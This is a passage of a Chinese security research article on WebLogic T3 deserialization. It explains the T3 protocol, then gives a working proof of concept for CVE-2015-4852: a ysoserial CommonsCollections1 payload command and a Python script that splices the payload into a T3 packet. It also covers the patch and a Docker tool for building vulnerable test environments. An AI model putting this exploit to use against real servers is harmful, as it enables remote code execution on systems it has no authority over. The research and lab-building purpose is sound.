                                lib/
                                examples.rmi.hello.HelloImpl
构建成功后，将jar包复制到WebLogic Server域对应的lib/文件夹中，通过WebLogic Server
管理控制台中的启动类和关闭类部署到WebLogic Server中，新建启动类如下：
重启WebLogic，即可在启动日志中看到如下内容：
HelloImpl created and bound in the registry to the name HelloServer
并且在服务器的JNDI树信息中可以看到HelloServer已存在：
WebLogic RMI的服务端已经部署完成，客户端只要使用java命令正常运行即可：
$java -cp “.;wlthint3client.jar;hello-1.0-SNAPSHOT.jar”
examples.rmi.hello.HelloClient 127.0.0.1 7001
运行结果如下图：
我们完成了一次正常的WebLogic RMI调用过程，我们也来看一下WebLogic RMI的调用数据包：
我在抓包之后想过找一份完整的T3协议的定义去详细的解释T3协议，但或许因为WebLogic不是开源软件，我最终没有找到类似的协议定义文档。因此我只能猜测T3协议包中每一部分的作用。虽然是猜测，但还是有几点值得注意，和漏洞利用关系很大，我放到下一节说。
再来看一下WebLogic RMI的调用流程：
前置知识讲完了，小结一下这些概念的关系，Java RMI即远程方法调用，默认使用JRMP协议通信。WebLogic RMI是WebLogic对Java
RMI的实现，其使用T3或IIOP协议作为通信协议。无论是Java RMI还是WebLogic RMI，都需要使用JNDI去发现远端的RMI服务。
两张图来解释它们的关系：
####  漏洞原理
上面，我详细解释了WebLogic RMI的调用过程，我们初窥了一下T3协议。那么现在我们来仔细看一下刚才抓到的正常WebLogic
RMI调用时T3协议握手后的第一个数据包,有几点值得注意的是：
  * 我们发现每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）
  * 每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）
  * 每个数据包上面都包含了一个T3协议头
  * 仔细看协议头部分，我们又发现数据包的前4个字节正好对应着数据包长度
  * 以及我们也能发现包长度后面的“01”代表请求，“02”代表返回
这些点说明了T3协议由协议头包裹，且数据包中包含多个序列化的对象。那么我们就可以尝试构造恶意对象并封装到数据包中重新发送了。流程如下：
替换序列化对象示意图如下：
剩下的事情就是找到合适的利用链了（通常也是最难的事）。
我用最经典的CVE-2015-4852漏洞，使用Apache Commons Collections链复现一下整个过程，制作一个简单的PoC。
首先使用Ysoserial生成Payload：
     $java -jar ysoserial.jar CommonsCollections1 'touch /hacked_by_tunan.txt' > payload.bin
然后我们使用Python发送T3协议的握手包，直接复制刚才抓到的第一个包的内容，看下效果如何：
    #!/usr/bin/python
    #coding:utf-8
    # weblogic_basic_poc.py
    import socket
    import sys
    import struct
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 第一个和第二个参数，传入目标IP和端口
    server_address = (sys.argv[1], int(sys.argv[2]))
    print 'connecting to %s port %s' % server_address
    sock.connect(server_address)
    # 发送握手包
    handshake='t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n'
    print 'sending "%s"' % handshake
    sock.sendall(handshake)
    data = sock.recv(1024)
    print 'received "%s"' % data
执行一下看结果：
    $python weblogic_basic_poc.py 127.0.0.1 7001
    connecting to 127.0.0.1 port 7001
    sending "t3 12.1.3
    AS:255
    HL:19
    MS:10000000
    "
    received "HELO:10.3.6.0.false
    AS:2048
    HL:19
    "
很好，和上面抓到的包一样，握手成功。继续下一步。 下一步我需要替换掉握手后的第一个数据包中的一组序列化数据，这个数据包原本是客户端请求WebLogic
RMI发的T3协议数据包。假设我们替换第一组序列化数据：
    # weblogic_basic_poc.py
    # 第三个参数传入一个文件名，在本例中为刚刚生成的“payload.bin”
    payloadObj = open(sys.argv[3],'rb').read()
    # 复制自原数据包，从24到155
    payload='\x00\x00\x05\xf8\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x72\x00\x00\xea\x60\x00\x00\x00\x19\...omit...\x70\x06\xfe\x01\x00\x00'
    # 要替换的Payload
    payload=payload+payloadObj
    # 复制剩余数据包，从408到1564
    payload=payload+'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61...omit...\x00\x00\x00\x00\x78'
    # 重新计算数据包大小并替换原数据包中的前四个字节
    payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])
    print 'sending payload...'
    sock.send(payload)
PoC构造完成，验证下效果：
    $python weblogic_basic_poc.py 127.0.0.1 7001 payload.bin
    connecting to 127.0.0.1 port 7001
    sending "t3 12.1.3
    AS:255
    HL:19
    MS:10000000
    "
    received "HELO:10.3.6.0.false
    AS:2048
    HL:19
    "
    sending payload...
执行后去目标系统根目录下，可以看到hacked_by_tunan.txt这个文件被创建成功，漏洞触发成功。
####  简要漏洞分析
简要的分析一下这个漏洞，远程调试时断点应下在wlserver/server/lib/wlthint3client.jar/weblogic/InboundMsgAbbrev的readObject()中。
可以看到此处即对我生成的恶意对象进行了反序列化，此处为第一次反序列化，不是命令的执行点。后续的执行过程和经典的apache-commons-collections反序列化漏洞执行过程一致，需要继续了解可参考@gyyyy的文章：《[浅析Java序列化和反序列化——经典的apache-commons-collections](https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md#%E7%BB%8F%E5%85%B8%E7%9A%84apache-commons-collections)》
####  补丁分析
WebLogic
T3反序列化漏洞用黑名单的方式修复，补丁位置在Weblogic.utils.io.oif.WebLogicFilterConfig.class:
此类型漏洞也经历了多次修复绕过的过程。
###  WebLogic其他漏洞
WebLogic是一个Web漏洞库，其中以反序列化漏洞为代表，后果最为严重。另外还有几个月前爆出的XXE漏洞：CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650、任意文件上传漏洞：CVE-2018-2894。此文不再展开讨论，感兴趣的可以对照上表中的文章详细了解。
## WebLogic环境搭建工具
前面说到，WebLogic环境搭建过程很繁琐，很多时候需要测试各种WebLogic版本和各种JDK版本的排列组合，因此我在这次研究的过程中写了一个脚本级别的WebLogic环境搭建工具。这一小节我会详细的说一下工具的构建思路和使用方法，也欢迎大家继续完善这个工具，节省大家搭建环境的时间。工具地址：
此环境搭建工具使用Docker和shell脚本，因此需要本机安装Docker才可以使用。经测试漏洞搭建工具可以在3分钟内构建出任意JDK版本搭配任意WebLogic版本，包含一个可远程调试的已启动的WebLogic
Server域环境。
###  需求
  * 自动化安装任意版本JDK
  * 自动化安装任意版本WebLogic Server
  * 自动化创建域
  * 自动打开远程调试
  * 自动启动一个WebLogic Server域
###  流程
###  使用方法：
####  下载JDK安装包和WebLogic安装包
下载相应的JDK版本和WebLogic安装包，将JDK安装包放到jdks/目录下，将WebLogic安装包放到weblogics/目录下。此步骤必须手动操作，否则无法进行后续步骤。
JDK安装包下载地址：https://www.oracle.com/technetwork/java/javase/archive-139210.html
WebLogic安装包下载地址：https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html
####  构建镜像并运行
回到根目录，执行Docker构建镜像命令：
    docker build --build-arg JDK_PKG= --build-arg WEBLOGIC_JAR=  -t  .
镜像构建完成后，执行以下命令运行：
    docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name  
以WebLogic12.1.3配JDK 7u21为例，构建镜像命令如下：
    docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.1.3.0.0_wls.jar  -t weblogic12013jdk7u21 .
镜像构建完成后，执行以下命令运行：
    docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic12013jdk7u21 weblogic12013jdk7u21
运行后可访问http://localhost:7001/console/login/LoginForm.jsp登录到WebLogic
Server管理控制台，默认用户名为weblogic,默认密码为qaxateam01
####  远程调试
如需远程调试，需使用docker cp将远程调试需要的目录从已运行的容器复制到本机。
也可以使用run_weblogic1036jdk6u25.sh、run_weblogic12013jdk7u21sh、run_weblogic12021jdk8u121.sh这三个脚本进行快速环境搭建并复制远程调试需要用到的目录。执行前请赋予它们相应的可执行权限。
####  示例
以JDK 7u21配合WebLogic 12.1.3为例，自动搭建效果如下：
###  兼容性测试
已测试了如下环境搭配的兼容性：
  * 测试系统：macOS Mojave 10.14.5
  * Docker版本：Docker 18.09.2
  * WebLogic 10.3.6 With JDK 6u25
  * WebLogic 10.3.6 With JDK 7u21
  * WebLogic 10.3.6 With JDK 8u121
  * WebLogic 12.1.3 With JDK 7u21
  * WebLogic 12.1.3 With JDK 8u121
  * WebLogic 12.2.1 With JDK 8u121
###  已知问题
  * 由于时间关系，我没有对更多WebLogic版本和更多的JDK版本搭配做测试，请自行测试
  * 请时刻关注输出内容，如出现异常请自行修改对应脚本
欢迎大家一起为此自动化环境搭建工具贡献力量。
## 总结
分析WebLogic漏洞异常辛苦，因为没有足够的资料去研究。因此想写这篇文帮助大家。但这篇文行文也异常痛苦，同样是没有资料，官方文档还有很多错误，很无奈。希望这篇文能对WebLogic的安全研究者有所帮助。不过通过写这篇文，我发现无论怎样也只是触及到了WebLogic的冰山一角，它很庞大，或者不客气的说很臃肿。我们能了解的太少太少，也注定还有很多点是没有被人开发过，比如WebLogic
RMI不止T3一种协议，实现weblogic.jndi.WLInitialContextFactory的也不止有wlthint3client.jar这一个jar包。还望大家继续深挖。
## 参考
  1. https://xz.aliyun.com/t/5448
  2. https://paper.seebug.org/584/
  3. https://paper.seebug.org/333/
  4. https://xz.aliyun.com/t/1825/#toc-2
  5. http://www.saxproject.org/copying.html
  6. https://www.4hou.com/vulnerable/12874.html
  7. https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/
  8. https://mp.weixin.qq.com/s/QYrPrctdDJl6sgcKGHdZ7g
  9. https://docs.oracle.com/cd/E11035_01/wls100/client/index.html
  10. https://docs.oracle.com/cd/E11035_01/wls100/client/index.html
  11. https://docs.oracle.com/middleware/12212/wls/INTRO/preface.htm#INTRO119
  12. https://docs.oracle.com/middleware/1213/wls/WLRMI/preface.htm#WLRMI101
  13. https://docs.oracle.com/middleware/11119/wls/WLRMI/rmi_imp.htm#g1000014983
  14. https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md
  15. http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
  16. https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/